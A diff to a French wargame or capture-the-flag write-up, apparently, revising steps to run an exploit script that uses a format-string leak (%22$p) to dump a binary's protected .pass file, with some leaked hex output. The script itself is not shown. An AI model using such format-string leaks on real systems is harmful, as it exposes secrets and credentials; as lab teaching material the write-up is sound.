@@ -33,9 +33,12 @@ la stack (voir /ressources/exploit) on peut voir que nos 0x414141414141 s'affich
 
 Nous savons donc que c'est a partir d'ici que le contenu du vrai fichier .pass sera stocke.
 
-Il suffit de lancer notre script sur le vrai binaire, puis de conserver les valeurs a partir de %22\$p.
+Il suffit de lancer notre script (Ressources/exploit) sur le vrai binaire, puis de conserver les valeurs a partir de %22\$p.
 
-        $ /tmp/exploit
+		*copier le contenu du script dans /tmp/exploit*
+		$ cd /tmp
+		$ chmod +x exploit
+        	$ ./exploit
 
         0x756e505234376848 does not have access!
         0x45414a3561733951 does not have access!
